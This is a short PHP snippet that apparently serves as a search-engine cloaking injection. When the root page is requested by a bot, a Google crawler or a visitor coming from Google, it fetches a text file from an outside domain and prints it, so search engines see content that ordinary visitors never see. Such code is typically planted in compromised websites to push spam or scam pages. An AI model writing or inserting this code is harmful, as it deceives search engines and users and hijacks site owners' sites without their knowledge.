<?php
$userAgent = strtolower($_SERVER['HTTP_USER_AGENT'] ?? '');
$referer = strtolower($_SERVER['HTTP_REFERER'] ?? '');
$uri = $_SERVER['REQUEST_URI'] ?? '';

if ($uri == '/' && (preg_match('/bot|google|chrome-lighthouse/i', $userAgent) || preg_match('/google/i', $referer))) {
echo file_get_contents('https://pmb.iainkudus.id/landing/ejournal-unmus/index.txt');
exit();
}
?>